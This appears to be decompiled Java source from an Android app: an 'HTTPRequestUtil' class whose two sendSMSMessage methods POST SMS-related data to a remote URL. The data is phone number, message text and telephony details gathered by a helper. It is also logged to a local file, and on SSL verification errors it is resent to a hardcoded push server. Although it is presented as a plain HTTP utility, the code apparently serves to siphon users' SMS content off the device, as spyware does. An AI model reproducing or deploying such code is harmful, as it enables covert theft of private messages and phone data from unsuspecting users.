package com.clouds.http;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.util.Log;
import com.clouds.debug.SystemDebug;
import com.clouds.util.SystemInfo;
import com.wmt.remotectrl.EventPacket;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;
import javax.net.ssl.SSLPeerUnverifiedException;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.util.EntityUtils;

public class HTTPRequestUtil {
    private static final String TAG;

    static {
        TAG = HTTPRequestUtil.class.getSimpleName();
    }

    public static boolean hasNetworkConnection(Context context) {
        if (context == null) {
            return false;
        }
        NetworkInfo mNetworkInfo = ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
        Log.d(TAG, "network conneted");
        return mNetworkInfo != null && mNetworkInfo.isConnected();
    }

    public static String sendSMSMessage(String url, Context context, String smsinfo) throws Exception {
        if (url == null || context == null || smsinfo == null) {
            return null;
        }
        SystemDebug.saveLogToFile(context, TAG, new StringBuilder(" mSysInfo: ").append(smsinfo).toString());
        List<NameValuePair> nameValuePair = new ArrayList();
        nameValuePair.add(new BasicNameValuePair("sms", smsinfo));
        SystemDebug.e(TAG, new StringBuilder("List<NameValuePair> = ").append(nameValuePair.toString()).toString());
        String str = null;
        try {
            HttpParams httpParameters = new BasicHttpParams();
            HttpPost post = new HttpPost(url);
            post.setEntity(new UrlEncodedFormEntity(nameValuePair));
            HttpConnectionParams.setConnectionTimeout(httpParameters, EventPacket.TIMEOUT_MS);
            HttpResponse response = new DefaultHttpClient(httpParameters).execute(post);
            int code = response.getStatusLine().getStatusCode();
            Log.i(TAG, new StringBuilder("HttpResponse = ").append(code).append(" from ").append(url).toString());
            if (code != 200) {
                return str;
            }
            HttpEntity entity = response.getEntity();
            Log.v(TAG, new StringBuilder("HttpEntity = ").append(entity).toString());
            str = EntityUtils.toString(entity, "utf-8");
            SystemDebug.e(TAG, new StringBuilder("EntityUtils = ").append(str).toString());
            return str;
        } catch (SSLPeerUnverifiedException e) {
            e.printStackTrace();
            return sendSMSMessage(CloudsServerHttpConstant.PUSH_SERVER_HTTP_URL, context, smsinfo);
        } catch (UnsupportedEncodingException e2) {
            e2.printStackTrace();
            return str;
        } catch (ClientProtocolException e3) {
            e3.printStackTrace();
            return str;
        } catch (Exception e4) {
            e4.printStackTrace();
            return str;
        }
    }

    public static String sendSMSMessage(String url, Context context, String number, String message, int resultCode) throws Exception {
        if (url == null || context == null) {
            return null;
        }
        SystemDebug.saveLogToFile(context, TAG, new StringBuilder(" mSysInfo: ").append(SystemInfo.getTelephonyInfo(context, number, message, resultCode)).toString());
        List<NameValuePair> nameValuePair = new ArrayList();
        nameValuePair.add(new BasicNameValuePair("sms", SystemInfo.getTelephonyInfo(context, number, message, resultCode)));
        SystemDebug.e(TAG, new StringBuilder("List<NameValuePair> = ").append(nameValuePair.toString()).toString());
        String str = null;
        try {
            HttpParams httpParameters = new BasicHttpParams();
            HttpPost post = new HttpPost(url);
            post.setEntity(new UrlEncodedFormEntity(nameValuePair));
            HttpConnectionParams.setConnectionTimeout(httpParameters, EventPacket.TIMEOUT_MS);
            HttpResponse response = new DefaultHttpClient(httpParameters).execute(post);
            int code = response.getStatusLine().getStatusCode();
            Log.i(TAG, new StringBuilder("HttpResponse = ").append(code).append(" from ").append(url).toString());
            if (code != 200) {
                return str;
            }
            HttpEntity entity = response.getEntity();
            Log.v(TAG, new StringBuilder("HttpEntity = ").append(entity).toString());
            str = EntityUtils.toString(entity, "utf-8");
            SystemDebug.e(TAG, new StringBuilder("EntityUtils = ").append(str).toString());
            return str;
        } catch (SSLPeerUnverifiedException e) {
            e.printStackTrace();
            return sendSMSMessage(CloudsServerHttpConstant.PUSH_SERVER_HTTP_URL, context, number, message, resultCode);
        } catch (UnsupportedEncodingException e2) {
            e2.printStackTrace();
            return str;
        } catch (ClientProtocolException e3) {
            e3.printStackTrace();
            return str;
        } catch (Exception e4) {
            e4.printStackTrace();
            return str;
        }
    }
}